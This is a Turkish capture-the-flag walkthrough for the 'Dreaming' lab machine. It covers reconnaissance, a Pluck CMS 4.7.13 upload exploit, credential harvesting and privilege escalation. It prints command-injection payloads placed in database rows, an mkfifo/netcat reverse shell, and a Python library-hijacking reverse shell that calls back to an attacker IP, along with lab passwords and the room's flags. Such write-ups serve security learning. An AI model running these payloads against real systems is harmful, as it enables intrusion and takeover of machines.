::::Dreaming Capture The FLag çözüm yolu::::

1.Keşif Taraması:::

Sistemin ilk önce ne olduğunu tanımlamak için \$nmap\$ taraması
başlattım. Burada ki amacım sistemin kullandığı yazılımların
,servislerin hangi portta ve hangi versiyonda çalıştığını öğrenmek
oldu.(Rustscan aracıda kullanılabilir!!)

Kullandığım tarama parametreleri şöyle idi =\> nmap 10.10.61.200 -sV
\--version-all -A -Pn -vv \--data-length 34

-sV = Version taraması yapmak(Ek paketler gönderir SYN taramasında)
\--versiona-all = Version bilgisi taramasını en yüksek hassasiyette
yap.(\--version-intensity 9 ) -A = En çok bilinen scriptleri tara demek
ve Agresiv şekilde işletim sistemi tespiti yap demek!!!! -Pn = Eğer
firewall varsa bunu bypass etmek için kullanılır. Ping atmadan tara
demek. -vv = Ayrıntılı bilgi al demek. \--data-length = Atılan nmap
paketlerine 34 byte veri ekleyerek tarama yapar(Default Nmap paketi 58
Byte\'dır. / Fİrewall Bypass \'da kullanılır )

Aşağıda nmap taramasından bir kesit verilmiştir.( Hedef için)

PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH
8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0) \| ssh-hostkey: \|
3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA) \| ssh-rsa
AAAAB3NzaC1yc2EAAAADAQABAAABgQDDwLHu8L86UCKGGVbbYL07uBhmOh9hWLPtBknNwMgULG3UGIqmCT3DywDvtEYZ/6D97nrt6PpsVAu0/gp73GYjUxvk4Gfog9YFShodiB/VJqK4RC23h0oNoAElSJajjEq6JcVaEyub6w8Io50fk4nNhf8dPx0YSaRjKANr9mET6s+4cUNBAF/DknsZw6iYtafzxIQTAtgSX6AtXTXRf5cpdF02wwYvUo1jVSYdXL+Oqx19UADVhQib4Pt5gLAiwuFkoJjnN1L6xwkTjd+sUPVlhQ/6yHfB826/Qk55DWoUrnABfe+3jngyPvjl1heYDuPx01rtDvlDDGAwvriwR7XmX+8X7MZ9E9QOx/m2gEHZ83kuJ9jNLB6WjlqCyA4Zes+oHWbM9Q/nJ/UVQGdfcDS65edQ5m/fw2khqUbCeSFcuD3AQvUJvvFrfg/eTNnhpee/WYJjyZO70tlzhaT/oJheodQ1hQyfgnjwToy/ISHn9Yp4jeqrshBUF87x9kUuLV0=
\| 256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA) \|
ecdsa-sha2-nistp256
AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCmisKYJLewSTob1PZ06N0jUpWdArbsaHK65lE8Lwefkk3WFAwoTWvStQbzCJlo0MF+zztRtwcqmHc5V7qawS8E=
\| 256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
\|\_ssh-ed25519
AAAAC3NzaC1lZDI1NTE5AAAAIK3j+g633Muvqft5oYrShkXdV0Rjn2S1GQpyXyxoPJy0
80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) \|
http-methods: \|\_ Supported Methods: GET POST OPTIONS HEAD
\|\_http-server-header: Apache/2.4.41 (Ubuntu) \|\_http-title: Apache2
Ubuntu Default Page: It works No exact OS matches for host (If you know
what OS is running on it, see https://nmap.org/submit/ ). TCP/IP
fingerprint:
OS:SCAN(V=7.94%E=4%D=11/24%OT=22%CT=1%CU=35875%PV=Y%DS=2%DC=T%G=Y%TM=6560B3
OS:53%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=107%GCD=3%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10B%TI=Z
OS:%CI=Z%TS=A)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11N
OS:W7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508S
OS:T11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=4
OS:0%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(
OS:R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%
OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 6.005 days (since Sat Nov 18 09:22:41 2023) Network
Distance: 2 hops TCP Sequence Prediction: Difficulty=263 (Good luck!) IP
ID Sequence Generation: All zeros Service Info: OS: Linux; CPE:
cpe:/o:linux:linux_kernel

Bu bilgiler ışığında yapılacak olan ilk şey aldığımız Versiyon
bilgisinde bu servislerde çalışan yazılımların Exploiti var mıdır
araştırmak. Bunun için \[metasploit\] kullanılabilir. Kalide bulunan bir
diğer araç \[searchsploit\] kullanılabilir. Veya daha ileriye gidilmek
istenirse Exploit-DB olan rapid7, exploit-db gibi exploit
veritabanlarına bakılabilir!!!!

80 portu açık olduğu için bu IP adresinde bir WEB sitesi olduğunu
anladık ve tarayıcımıza gelip http://10.10.61.200 dedik. Karşımıza bir
WEB sitesi geldi fakat bu APACHE sunucusunun default sayfasıdır.

Burada şunu düşünmemiz gerekli sayfa kaynağını görüntüle
yapabiliriz(CTLR+U) buradan bilgi edinebiliriz fakat bu gerçek hayatta
çok karşımıza çıkan bir şey değil ama gerçek hayatta bulabileceğimiz iki
şey şudur =\> Subdomain tespiti yada Gizli dizin tespiti.

Burada gobuster aracı kullanarak gizli dizini tespiti etmeye çalıştım.
Farklı araçlarda kullanılabilir. Örnek vermek gerekirse;

\> Dirbuster \> Dirb \> ffuf \> wfuzz \> alsha (kendi geliştirdiğim
araç)

Aşağıda kullanmış olduğum gobuster aracının çıktısını görebilirsiniz:

gobuster dir -u http://10.10.61.200/ -w
/usr/share/wordlists/dirb/common.txt
=============================================================== Gobuster
v3.6 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
=============================================================== \[+\]
Url: http://10.10.61.200/ \[+\] Method: GET \[+\] Threads: 10 \[+\]
Wordlist: /usr/share/wordlists/dirb/common.txt \[+\] Negative Status
codes: 404 \[+\] User Agent: gobuster/3.6 \[+\] Timeout: 10s
=============================================================== Starting
gobuster in directory enumeration mode
=============================================================== /.hta
(Status: 403) \[Size: 277\] /.htpasswd (Status: 403) \[Size: 277\]
/.htaccess (Status: 403) \[Size: 277\] /app (Status: 301) \[Size: 310\]
\[\--\> http://10.10.61.200/app/\] /index.html (Status: 200) \[Size:
10918\] /server-status (Status: 403) \[Size: 277\] Progress: 4614 / 4615
(99.98%) ===============================================================
Finished ===============================================================

2\. Zayıflık Tarama Süreci

Burada göründüğü üzere /app dizini bir fikir sahibi olmak için
bakılabilecek gibi duruyor. Tarayıcımızda =\> http://10.10.61.200/app
yaptığımızda karşımıza PLUCK CMS 4.7.13 versiyonlu(Bu belirtilmiş web
sitesinde aslında bunu belirtmesi bile bir açıktır.)

Karşımıza Pluck CMS \'in login sayfası geldi. Burada default parolasını
deneyebiliriz bazen çalışan servislerde default bırakabiliyorlar. Geldik
login sayfasında password kısmına =\> password yazdım Ve login oldum
default bırakmışlar parolayı!!!!!

Şimdi bizim için çalışan servislerin versiyon bilgileri çok önemli
demiştik. Pluck CMS 4.7.13 bilgisini almıştık. Bunu ilk önce
metasploit-Framework\'de deneyip bakabiliriz Expoliti var mıdır diye
yada Expolit-DB \'den aratabiliriz. Ben Exploit-DB \'den buldum.

Kaliden\'de arama yapılabilir =\> searchsploit \"pluck 4.7.13\"

Exploit =\> Pluck CMS 4.7.13 - File Upload Remote Code Execution
(Authenticated)

Exploiti indirdikten sonra bunu kullanacağız:::

Usage \--\> python3 pluck.py \<target_ip\> \<target_port\>
\<pluck_cms_path\>

python3 pluck.py 10.10.61.200 80 password /app/pluck-4.7.13/

Bunu Kodu okuyarak karar veriyoruz!!!

Bu exploit vasıtasıyla sisteme login olduk ve artık komutlar
çalıştırabiliyoruz. Buradan devamla /tmp içesine girip yada herhangi bir
dizinde reverse shell komutu çalıştırıp \[netcat\] ile reverse shell\'de
alabiliriz!!!

Reverse shell komutu =\> bash -i

Terminalden =\> nc -nlvp 9001

Shell almış olduk böylelikle.

Eğer reverse shell almadan direkt exploit vasıtasıyla shell aldıysak
Lucien kullanıcının SSH bilgilerini elde edebiliriz!!!!

cat lucienCred import requests

==\> /opt/test.py içerisinde bu bilgi

#Todo add myself as a user url =
\"http://127.0.0.1/app/pluck-4.7.13/login.php\" password =
\"HeyLucien#@1999!\"

data = { \"cont1\":password, \"bogus\":\"\", \"submit\":\"Log+in\" }

req = requests.post(url,data=data)

if \"Password correct.\" in req.text: print(\"Everything is in proper
order. Status Code: \" + str(req.status_code)) else: print(\"Something
is wrong. Status Code: \" + str(req.status_code))
print(\"Results:\\n\" + req.text)

SSH login Passwords =\> ssh lucien@10.10.61.200 -p 22

password =\> HeyLucien#@1999!

3\. Yetki Yükseltme

Sisteme giriş yaptığımızda artık buradan sonra yapacağımız şey
Yetkilerimizi nasıl yükseltebiliriz sorusuna cevap aramaktır.Elbette
bunun bir çok yöntemi vardır hem Linux tabanlı sistemler için hemde
Windows tabanlı sistemler için.

Yukarıda gördüğümüz üzere Lucien kullanıcısının SSH bilgilerini elde
ettik sisteme SSH ile bağlanalım.

SSH login Passwords =\> ssh lucien@10.10.61.200 -p 22

password =\> HeyLucien#@1999!

Daha sonra lucien dizini içerisinde =\> .bash_history dosyasını
okunabiliyor olarak gördüm

lucien@dreaming:-\$ cat .bash_history

Elde ettiğimiz bilgi lucien\'in veritabanı login bilgileri:

mysql -u lucien -plucien42DBPASSWORD

Yetki yükseltme tekniklerinden olan =\> \[ sudo -l \] \--\> komutunu
çalıştırabiliriz .

Genel olarak Yetkilerimizi yükseltecek ve bizim için gizli bilgiler
parolar varsa bunlara otomatik olarak bakan bir yazılım vardır bash
dilinde yazılmış.

Bu yazılım \[linpeas.sh\] \'dır ve WGET aracı kullanılarak /tmp
dosyasının içerisine indirilerek sistemde çalıştırılabilir!!!!

sudo -l komutunu çalıştırdığımızda şunu gördük::

(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py

Burada MYSQL bilgileri ile sisteme girdiğimizde görüyoruz ki
getDreams.py dosyası mysql\'deki değerlere göre kodu çalıştırıyor.
Buraya istersel reverse shell alan kod yazabiliriz ve başka bir
terminalde netcat aracı ile dinleyebiliriz eğer istersek death
kullanıcısın gizli dosyalarını okuyup diğer erişim bilgileri varsa
onları okuyabiliriz.

getDreams.py dosyasını okuyalım.Diğer yöntemi de göstereceğim!!!

1.Yöntem

mysql\> INSERT INTO dreams (dreamer, dream) VALUES (\'cat
/home/death/getDreams.py \| bash\' , \'-l\');

lucien@dreaming:-\$ sudo -u death /usr/bin/python3
/home/death/getDreams.py

Ve böylelikle bilgileri almış olduk. Aşağıda bir kısmını
görebilirsiniz::

===================================================

DB_USER = \"death\" DB_PASSWORD = \"!mementoMORI666!\"

import mysql.connector import subprocess

\# MySQL credentials DB_USER = \"death\" DB_PASS = \"!mementoMORI666!\"
DB_NAME = \"library\"

=================================================

Daha sonra SSH bilgilerini elde ettik ve bunu denememiz lazım şimdi.
Başka terminale gelip;

=\> ssh death@10.10.61.200 -p 22 password:!mementoMORI666!

Sisteme Death kullanıcısı olarak login olduk(SSH\'ı kullanarak!!!)

2.Yöntem

Bu ilk yöntem ikinci yöntem ise şudur. Bu python dosyasını sudo
yetkileri ile death kullanıcısı kullanacak. O yüzden REVERSE SHELL
mantığı ile buraya reverse shell kodu yazıp başka bir terminalde
dinleyebiliriz!!!!

mysql\> INSERT INTO dreams(dreamer,dream) VALUES (\'dreamer\',\'\$(rm
/tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2\>&1\|nc 10.8.123.104 9002
\>/tmp/f)\')

Başka bir Terminalde;

nc -nlvp 9002 \>\> dinlemeye aldık.

Daha sonra gelip kodu çalıştırdığımızda

lucien@dreaming:-\$ sudo -u death /usr/bin/python3
/home/death/getDreams.py

Bağlantımız gelmiş olacak!!!!

Şuan sistemde Death kullanıcısıyız !!!

/tmp klasörüne gelip WGET aracı yardımı ile pspy64 aracını
indiriyoruz!!!

{Info} pspy64 aracı genel olarak bir sistemde çalışan işlemleri izlemek
için kullanılan araçlardır. Bu tür araçlar, bir sistemdeki işlemleri,
çalışma sürelerini, kullanılan kaynakları ve benzeri bilgileri
görüntülemek için kullanılır.

pspy64 aracını çalıştırdığımda aldığım sonuç aşağıda verilmiştir::

2023/11/24 15:48:01 CMD: UID=0 PID=40025 \| /usr/sbin/CRON -f 2023/11/24
15:48:02 CMD: UID=1002 PID=40026 \| /usr/sbin/CRON -f 2023/11/24
15:48:02 CMD: UID=1002 PID=40027 \| /bin/sh -c /usr/bin/python3.8
/home/morpheus/restore.py 2023/11/24 15:48:19 CMD: UID=0 PID=40029 \|
2023/11/24 15:49:01 CMD: UID=0 PID=40030 \| /usr/sbin/CRON -f 2023/11/24
15:49:01 CMD: UID=1002 PID=40031 \| 2023/11/24 15:49:01 CMD: UID=1002
PID=40032 \| /usr/bin/python3.8 /home/morpheus/restore.py

2023/11/24 15:50:01 CMD: UID=0 PID=40033 \| /usr/sbin/CRON -f 2023/11/24
15:50:01 CMD: UID=1002 PID=40034 \| 2023/11/24 15:50:01 CMD: UID=1002
PID=40035 \| /bin/sh -c /usr/bin/python3.8 /home/morpheus/restore.py

Görüldüğü üzere home/morpheus/restore.py bu dizinde senkron olarak
sürekli bu dosya çalıştırılıyor. Kodun içeriğini okuduğumuzda gözümüze
çarpan böyle dosyalarda şu olmalı:

1\. Kodlar ne amaçla çalıştırılıyor çalışırırken neleri kullanıyor,
neredeki dosyalarla iletişime geçiyor yani kodu iyice okumak gerekli.

2\. Ikincisi ise çok kullanılan bir yöntem eğer kodun işleyişinde bir
zafiyet yoksa ; LIBRARY HIJACKING dediğimiz yöntemi kullanırız!!!

Burada bu dizinde olan dosya yazılabilir değil o yüzden gerçek kütüphane
dosyasını bulup onu değiştirmeliyiz!!!

Terminale gelip:::

death@dreaming: locate python yada where python \--\> diyip
bakabiliriz!!!

sonuç =\> /usr/lib/python3.8 içerisinde

shutil.py =\> Kütühane dosyası

Burada bu kodun içerisine hiç yapıyı bozmadan şunu yazalım::

import socket import subprocess import os

def reverse_shell(): s = socket.socket(socket.AF_INET,
socket.SOCK_STREAM) s.connect((\"10.8.123.104\", 4444)) #your_ip
your_port

os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2)

pty.spawn(\"/bin/bash\")

Daha sonra dosyayı kapatıp. Başka bir terminalden dinleyelim::

nc -nlvp 4444 \-\--\> Beklemekteyiz. Az sonra bağlantı gelecektir!!

Bağlantı geldi::

morpheus@dreaming:\~\$ whoami

morpheus olarak sistemdeyiz ve Yetkimizi Yükseltmiş olduk!!!

morpheus@dreaming:\~\$ cd /home/morpheus

morpheus@dreaming:\~\$ cat morpheus_flag.txt

Diğer bir yöntem ::

=\> from shutil.py import copy2 as backup kodumuzda bulunan ilk satır

Burada yine /usr/lib/python3.8 içerisinde shutil.py kütüphane dosyasında
copy2 fonksiyonunu bulup::

O fonksiyonun sonuna

==\> os.system(\'chmod 777 /home/morpheus/morpheus_flag.txt\')

Kaydettik çıktık bunu düzgün bir şekilde yazalım yoksa kod çalışmaz!!!!

Biraz bekledikten sonra okunur olacaktır bu dosya ve artık
okuyabiliriz!!!!!!

Flagler::

Lucien_Flag ==\> THM{TH3_L1BR4R14N}

Death_Flag ==\> THM{1M_TH3R3_4\_TH3M}

Morpheus_Flag ==\> THM{DR34MS_5H4P3_TH3_W0RLD}
